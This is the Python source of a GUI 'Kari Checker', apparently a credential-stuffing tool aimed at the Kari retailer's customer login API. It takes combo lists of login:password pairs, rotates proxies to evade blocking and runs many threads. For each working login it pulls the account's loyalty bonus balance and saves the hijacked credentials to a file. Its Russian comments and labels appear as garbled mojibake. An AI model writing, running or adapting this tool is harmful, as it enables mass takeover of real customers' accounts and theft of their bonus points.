import tkinter as tk
from tkinter import filedialog, messagebox
import threading
import requests
import random
import datetime
from concurrent.futures import ThreadPoolExecutor
from tkinter import ttk

accounts = []
proxies = []
use_proxies = False
save_log_enabled = False
skip_zero_balance = False

valid_count = 0
invalid_count = 0
zero_balance_count = 0
processed_count = 0

lock = threading.Lock()
log_file = None
valid_output_file = None

# üìÑ –ó–∞–ø–∏—Å—å –≤ –ª–æ–≥-—Ñ–∞–π–ª
def write_log(message):
    if save_log_enabled and log_file:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(message + "\n")

# üíæ –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤–∞–ª–∏–¥–Ω—ã–π –∞–∫–∫–∞—É–Ω—Ç
def save_valid_account(data):
    with open(valid_output_file, "a", encoding="utf-8") as f:
        f.write(data + "\n")

# üß™ –ü—Ä–æ–≤–µ—Ä–∫–∞ –æ–¥–Ω–æ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞
def check_account(account):
    global valid_count, invalid_count, zero_balance_count, processed_count

    max_retries = 3
    attempt = 0
    while attempt < max_retries:
        try:
            login, password = account.strip().split(":")
            proxy_dict = None

            if login.isdigit() and not login.startswith("+"):
                login = "+" + login

            if use_proxies and proxies:
                proxy = random.choice(proxies).strip()
                proxy_dict = {
                    "http": f"http://{proxy}",
                    "https": f"http://{proxy}",
                }

            s = requests.Session()
            s.get("https://kari.com/auth/", proxies=proxy_dict, timeout=10)

            url = "https://i.api.kari.com/ecommerce/client/login"
            payload = {"login": login, "password": password}

            response = s.post(url, json=payload, proxies=proxy_dict, timeout=10)

            log_message = (
                f"\nüì§ REQUEST: {login}:{password}\n"
                f"‚û°Ô∏è POST {url}\n"
                f"‚û°Ô∏è BODY: {payload}\n\n"
                f"üì• RESPONSE:\n"
                f"‚úÖ Status: {response.status_code}\n"
                f"‚úÖ Text: {response.text.strip()}\n"
                f"{'-'*60}"
            )

            if response.status_code == 200 and response.text.strip().lower() == "ok":
                kari_token = s.cookies.get("KariToken")
                if not kari_token:
                    raise Exception("Token not found")

                headers = {"Authorization": f"Bearer {kari_token}"}
                balance_url = "https://i.api.kari.com/cloud/eshop/clients/kariclub/balance?withMarkedBonuses=true"
                balance_resp = s.get(balance_url, headers=headers, proxies=proxy_dict, timeout=10)

                if balance_resp.status_code == 200:
                    balance_data = balance_resp.json()
                    data = balance_data.get("data", {})
                    marked_bonuses = balance_data.get("markedBonuses", [])
                    active_points = data.get("activePoints", 0)
                    expiration_date = None

                    if marked_bonuses and isinstance(marked_bonuses, list):
                        expiration_date = marked_bonuses[0].get("expirationDate")

                    if skip_zero_balance and active_points == 0:
                        with lock:
                            zero_balance_count += 1
                            invalid_count += 1
                        write_log(f"{log_message}\nü•∂ –ü—Ä–æ–ø—É—â–µ–Ω (0 –±–æ–Ω—É—Å–æ–≤): {login}:{password}")
                        break

                    valid_entry = (
                        f"‚úÖ –ê–∫–∫–∞—É–Ω—Ç: {login}:{password}\n"
                        f"üí∞ –ë–æ–Ω—É—Å—ã: {active_points}\n"
                    )
                    if expiration_date:
                        valid_entry += f"üìÖ –°–≥–æ—Ä–∞—é—Ç: {expiration_date}\n"
                    valid_entry += "------------------------------"

                    with lock:
                        valid_count += 1
                        save_valid_account(valid_entry)
                        write_log(f"{log_message}\nüéâ VALID: {login}:{password} | –ë–æ–Ω—É—Å—ã: {active_points}")
                    break
                else:
                    raise Exception(f"–û—à–∏–±–∫–∞ –±–∞–ª–∞–Ω—Å–∞: {balance_resp.status_code}")
            else:
                raise Exception(f"–ù–µ–≤–∞–ª–∏–¥–Ω—ã–π –∞–∫–∫–∞—É–Ω—Ç")
        except Exception as e:
            attempt += 1
            if attempt < max_retries:
                write_log(f"‚ö†Ô∏è –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ {account} ‚Üí {str(e)}. –ü–æ–ø—ã—Ç–∫–∞ {attempt}/{max_retries}")
            else:
                with lock:
                    invalid_count += 1
                write_log(f"‚ùå FAILED after retries: {account} ‚Üí {str(e)}")
        finally:
            with lock:
                processed_count += 1
            update_gui()

# üìÇ –í—ã–±–æ—Ä –∞–∫–∫–∞—É–Ω—Ç–æ–≤
def select_accounts_file():
    path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
    if path:
        with open(path, "r", encoding="utf-8") as f:
            content = f.read().splitlines()
        accounts.clear()
        accounts.extend(content)
        accounts_label.config(text=f"–ó–∞–≥—Ä—É–∂–µ–Ω–æ –∞–∫–∫–∞—É–Ω—Ç–æ–≤: {len(accounts)}")
        progress_bar["maximum"] = len(accounts)
        progress_bar["value"] = 0

# üìÇ –í—ã–±–æ—Ä –ø—Ä–æ–∫—Å–∏
def select_proxies_file():
    path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
    if path:
        with open(path, "r", encoding="utf-8") as f:
            content = f.read().splitlines()
        proxies.clear()
        proxies.extend(content)
        proxies_label.config(text=f"–ó–∞–≥—Ä—É–∂–µ–Ω–æ –ø—Ä–æ–∫—Å–∏: {len(proxies)}")

# üåê –ó–∞–≥—Ä—É–∑–∫–∞ –ø—Ä–æ–∫—Å–∏ –ø–æ —Å—Å—ã–ª–∫–µ
def load_proxies_from_url():
    def download():
        url = url_entry.get().strip()
        if not url.startswith("http"):
            messagebox.showerror("–û—à–∏–±–∫–∞", "–í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—É—é —Å—Å—ã–ª–∫—É (http...)")
            return
        try:
            resp = requests.get(url, timeout=10)
            if resp.status_code == 200:
                new_proxies = resp.text.strip().splitlines()
                with lock:
                    proxies.clear()
                    proxies.extend([p.strip() for p in new_proxies if p.strip()])
                proxies_label.config(text=f"–ó–∞–≥—Ä—É–∂–µ–Ω–æ –ø—Ä–æ–∫—Å–∏: {len(proxies)}")
                top.destroy()
            else:
                messagebox.showerror("–û—à–∏–±–∫–∞", f"–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏. –ö–æ–¥: {resp.status_code}")
        except Exception as e:
            messagebox.showerror("–û—à–∏–±–∫–∞", str(e))

    top = tk.Toplevel(root)
    top.title("–ó–∞–≥—Ä—É–∑–∫–∞ –ø—Ä–æ–∫—Å–∏ –ø–æ —Å—Å—ã–ª–∫–µ")
    top.configure(bg="#1e1e1e")
    tk.Label(top, text="–í—Å—Ç–∞–≤—å—Ç–µ —Å—Å—ã–ª–∫—É:", bg="#1e1e1e", fg="white").pack(pady=5)
    url_entry = tk.Entry(top, width=60)
    url_entry.pack(pady=5)
    tk.Button(top, text="–ó–∞–≥—Ä—É–∑–∏—Ç—å", command=download, bg="#2e2e2e", fg="white").pack(pady=10)

# üîÑ –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ GUI
def update_gui():
    root.after(0, lambda: valid_label.config(text=f"‚úÖ –í–∞–ª–∏–¥–Ω—ã—Ö: {valid_count}"))
    root.after(0, lambda: invalid_label.config(text=f"‚ùå –ù–µ–≤–∞–ª–∏–¥–Ω—ã—Ö: {invalid_count}"))
    root.after(0, lambda: zero_balance_label.config(text=f"ü•∂ –° 0 –±–æ–Ω—É—Å–∞–º–∏: {zero_balance_count}"))
    root.after(0, lambda: progress_bar.config(value=processed_count))

# üöÄ –ó–∞–ø—É—Å–∫ –ø—Ä–æ–≤–µ—Ä–∫–∏
def run_checker():
    global use_proxies, save_log_enabled, skip_zero_balance
    global valid_count, invalid_count, zero_balance_count, processed_count
    global log_file, valid_output_file

    valid_count = invalid_count = zero_balance_count = processed_count = 0
    update_gui()

    use_proxies = proxy_var.get()
    save_log_enabled = save_log_var.get()
    skip_zero_balance = skip_zero_var.get()
    threads = thread_slider.get()

    timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    log_file = f"log_{timestamp}.txt" if save_log_enabled else None
    valid_output_file = f"valid_{timestamp}.txt"

    write_log(f"üîÑ –ù–∞—á–∞–ª–æ –ø—Ä–æ–≤–µ—Ä–∫–∏ ({threads} –ø–æ—Ç–æ–∫–æ–≤)")

    with ThreadPoolExecutor(max_workers=threads) as executor:
        for account in accounts:
            executor.submit(check_account, account)

# ‚ñ∂Ô∏è –ö–Ω–æ–ø–∫–∞ —Å—Ç–∞—Ä—Ç
def start_check():
    if not accounts:
        messagebox.showerror("–û—à–∏–±–∫–∞", "–°–Ω–∞—á–∞–ª–∞ –≤—ã–±–µ—Ä–∏—Ç–µ —Ñ–∞–π–ª —Å –∞–∫–∫–∞—É–Ω—Ç–∞–º–∏.")
        return
    threading.Thread(target=run_checker, daemon=True).start()

# ========== üñ•Ô∏è UI ==========
root = tk.Tk()
root.title("Kari Checker")
root.geometry("500x570")
root.configure(bg="#1e1e1e")

style_opts = {"bg": "#1e1e1e", "fg": "#ffffff", "font": ("Arial", 10)}
button_opts = {"bg": "#2e2e2e", "fg": "white", "activebackground": "#3e3e3e"}

tk.Label(root, text="üß™ Kari Checker", font=("Arial", 14, "bold"), bg="#1e1e1e", fg="white").pack(pady=10)

tk.Button(root, text="üìÇ –í—ã–±—Ä–∞—Ç—å –∞–∫–∫–∞—É–Ω—Ç—ã", command=select_accounts_file, **button_opts).pack(pady=5)
accounts_label = tk.Label(root, text="–ó–∞–≥—Ä—É–∂–µ–Ω–æ –∞–∫–∫–∞—É–Ω—Ç–æ–≤: 0", **style_opts)
accounts_label.pack()

proxy_var = tk.BooleanVar()
tk.Checkbutton(root, text="üõ° –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –ø—Ä–æ–∫—Å–∏", variable=proxy_var, **style_opts, selectcolor="#1e1e1e").pack(pady=5)

tk.Button(root, text="üìÇ –í—ã–±—Ä–∞—Ç—å —Ñ–∞–π–ª –ø—Ä–æ–∫—Å–∏", command=select_proxies_file, **button_opts).pack(pady=5)
tk.Button(root, text="üåê –ó–∞–≥—Ä—É–∑–∏—Ç—å –ø—Ä–æ–∫—Å–∏ –ø–æ —Å—Å—ã–ª–∫–µ", command=load_proxies_from_url, **button_opts).pack(pady=5)
proxies_label = tk.Label(root, text="–ó–∞–≥—Ä—É–∂–µ–Ω–æ –ø—Ä–æ–∫—Å–∏: 0", **style_opts)
proxies_label.pack()

save_log_var = tk.BooleanVar()
tk.Checkbutton(root, text="üíæ –°–æ—Ö—Ä–∞–Ω—è—Ç—å –ª–æ–≥", variable=save_log_var, **style_opts, selectcolor="#1e1e1e").pack(pady=5)

skip_zero_var = tk.BooleanVar()
tk.Checkbutton(root, text="ü•∂ –ù–µ —Å–æ—Ö—Ä–∞–Ω—è—Ç—å —Å 0 –±–æ–Ω—É—Å–∞–º–∏", variable=skip_zero_var, **style_opts, selectcolor="#1e1e1e").pack(pady=5)

tk.Label(root, text="üîÅ –ö–æ–ª-–≤–æ –ø–æ—Ç–æ–∫–æ–≤:", **style_opts).pack(pady=5)
thread_slider = tk.Scale(root, from_=1, to=20, orient=tk.HORIZONTAL, bg="#2e2e2e", fg="white", highlightbackground="#1e1e1e")
thread_slider.set(5)
thread_slider.pack()

tk.Button(root, text="üöÄ –°—Ç–∞—Ä—Ç", command=start_check, **button_opts).pack(pady=10)

progress_bar = ttk.Progressbar(root, length=400, mode="determinate")
progress_bar.pack(pady=10)

valid_label = tk.Label(root, text="‚úÖ –í–∞–ª–∏–¥–Ω—ã—Ö: 0", **style_opts)
valid_label.pack()

invalid_label = tk.Label(root, text="‚ùå –ù–µ–≤–∞–ª–∏–¥–Ω—ã—Ö: 0", **style_opts)
invalid_label.pack()

zero_balance_label = tk.Label(root, text="ü•∂ –° 0 –±–æ–Ω—É—Å–∞–º–∏: 0", **style_opts)
zero_balance_label.pack()

tk.Label(root, text="by @yourname", font=("Arial", 8), bg="#1e1e1e", fg="#555555").pack(side="bottom", pady=5)

root.mainloop()
